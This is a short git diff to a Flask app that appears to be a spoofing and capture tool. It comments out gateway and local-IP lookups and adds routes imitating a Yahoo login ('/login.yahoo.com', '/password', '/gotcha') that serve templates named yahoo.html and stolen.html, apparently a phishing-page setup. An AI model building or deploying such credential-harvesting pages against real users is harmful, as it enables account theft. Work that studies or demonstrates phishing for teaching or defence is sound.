@@ -13,11 +13,11 @@ import socket
 
 app = Flask(__name__)
 
-gateways = netifaces.gateways()
-gateway_ip = gateways['default'][netifaces.AF_INET][0]
+#gateways = netifaces.gateways()
+#gateway_ip = gateways['default'][netifaces.AF_INET][0]
 
-hostname=socket.gethostname()   
-local_ip=socket.gethostbyname(hostname) 
+# hostname=socket.gethostname()   
+# local_ip=socket.gethostbyname(hostname) 
 
 # def get_network_range(ip_address):
 #     network = ipaddress.ip_interface(ip_address+'/24')
@@ -122,6 +122,18 @@ def spoof_ip():
     return redirect(url_for('capture'))
 
 
+@app.route(f'/login.yahoo.com', methods=['GET'])
+def login():
+    return render_template('yahoo.html')
+
+@app.route(f'/password', methods=['GET'])
+def password():
+    return render_template('plm.html')
+
+@app.route(f'/gotcha', methods=['GET'])
+def gotcha():
+    return render_template('stolen.html')
+
 # def sniff_packets(stop_event):
 #     def process_packet(packet):
 #         return {
@@ -143,3 +155,4 @@ def spoof_ip():
 
 if __name__ == '__main__':
     app.run(debug=True)
+
